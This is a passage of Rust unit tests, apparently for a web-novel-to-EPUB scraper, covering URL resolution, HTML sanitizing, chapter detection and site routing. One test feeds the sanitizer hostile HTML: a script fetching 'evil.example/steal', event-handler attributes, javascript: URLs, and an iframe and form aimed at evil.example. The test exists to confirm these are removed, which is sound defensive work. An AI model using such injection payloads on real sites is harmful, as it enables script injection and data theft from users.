            absolutize("https://a.com/novel/toc", "/chapter/1"),
            "https://a.com/chapter/1"
        );
        assert_eq!(
            absolutize("https://a.com/novel/toc", "chapter-1"),
            "https://a.com/novel/chapter-1"
        );
        assert_eq!(
            absolutize("https://a.com/x", "//cdn.a.com/img"),
            "https://cdn.a.com/img"
        );
    }

    #[test]
    fn sanitizer_keeps_whitelist_and_drops_scripts() {
        let dirty = r#"<div class="c"><p>Hello <a href="/x">world</a> &amp; more</p>
            <script>alert(1)</script><img src="x.png"/><p><br>Line</p></div>"#;
        let clean = sanitize_to_xhtml(dirty);
        assert!(clean.contains("<p>Hello world &amp; more</p>"));
        assert!(clean.contains("<br/>"));
        assert!(!clean.contains("script"));
        assert!(!clean.contains("img"));
        assert!(!clean.contains("href"));
    }

    #[test]
    fn sanitizer_escapes_raw_text() {
        let clean = sanitize_to_xhtml("<p>a < b & c</p>");
        // The parser recovers from the stray '<'; output must stay well-formed.
        assert!(!clean.contains("< b"));
        assert!(clean.contains("&amp;"));
    }

    #[test]
    fn sanitizer_blocks_injection_attempts() {
        // Everything a hostile chapter page could smuggle in must come out
        // as inert text or vanish entirely: EPUB readers execute nothing.
        let hostile = r#"<div>
            <script>fetch('https://evil.example/steal')</script>
            <p onclick="alert(1)" style="background:url(javascript:x)">Text</p>
            <a href="javascript:alert(1)">click me</a>
            <img src="x" onerror="alert(1)"/>
            <iframe src="https://evil.example"></iframe>
            <form action="https://evil.example"><button>go</button></form>
            <p><![CDATA[<script>nested</script>]]></p>
        </div>"#;
        let clean = sanitize_to_xhtml(hostile);
        assert!(!clean.contains("script"), "script survived: {clean}");
        assert!(!clean.contains("onclick"));
        assert!(!clean.contains("onerror"));
        assert!(!clean.contains("javascript:"));
        assert!(!clean.contains("iframe"));
        assert!(!clean.contains("<form"));
        assert!(!clean.contains("href"));
        assert!(!clean.contains("style="));
        // The legitimate text is kept.
        assert!(clean.contains("<p>Text</p>"));
        assert!(clean.contains("click me"));
    }

    #[test]
    fn sanitizer_output_has_no_attributes_at_all() {
        // The whitelist serializer emits bare tag names only, so no attribute
        // of any kind — benign or hostile — can reach the EPUB.
        let clean = sanitize_to_xhtml(r#"<p class="x" data-y="z" id="a">hi</p>"#);
        assert_eq!(clean, "<p>hi</p>");
    }

    #[test]
    fn chapter_text_heuristic() {
        assert!(looks_like_chapter_text("Chapter 12: The Fall"));
        assert!(looks_like_chapter_text("Kapitel 3"));
        assert!(looks_like_chapter_text("Ch. 44"));
        assert!(looks_like_chapter_text("103. Rebirth"));
        assert!(!looks_like_chapter_text("About the Author"));
        assert!(!looks_like_chapter_text(""));
    }

    #[test]
    fn detect_source_by_host() {
        assert_eq!(
            detect_source("https://www.royalroad.com/fiction/1").id(),
            "royalroad"
        );
        assert_eq!(
            detect_source("https://wtr-lab.com/en/novel/95971/ein-titel").id(),
            "wtrlab"
        );
        assert_eq!(
            detect_source("https://www.divinedaolibrary.com/novel-x/").id(),
            "wordpress"
        );
        assert_eq!(
            detect_source("https://www.novelupdates.com/series/x/").id(),
            "novelupdates"
        );
        assert_eq!(
            detect_source("https://novelphoenix.com/novel/x").id(),
            "novelphoenix"
        );
        assert_eq!(
            detect_source("https://freewebnovel.com/book/x").id(),
            "generic"
        );
        assert_eq!(
            detect_source("https://lightnovelpub.me/book/x").id(),
            "lightnovelpub"
        );
        assert_eq!(
            detect_source("https://chikari.moe/novels/x").id(),
            "chikari"
        );
        assert_eq!(
            detect_source("https://novelfire.net/book/x").id(),
            "novelfire"
        );
        assert_eq!(
            detect_source("https://novelarrow.com/novel/x").id(),
            "novelarrow"
        );
        assert_eq!(detect_source("https://random-site.org/n/1").id(), "generic");
    }

    #[test]
    fn browser_routing_covers_challenged_sources_but_rejects_lookalikes() {
        for host in [
            "novelupdates.com",
            "novellunar.com",
            "novelarrow.com",
            "freewebnovel.com",
            "lightnovelpub.me",
            "novelfire.net",
        ] {
            assert!(is_webview_routed(&format!("https://www.{host}/book/x")));
            assert!(!is_webview_routed(&format!("https://not{host}/book/x")));
        }
    }
}
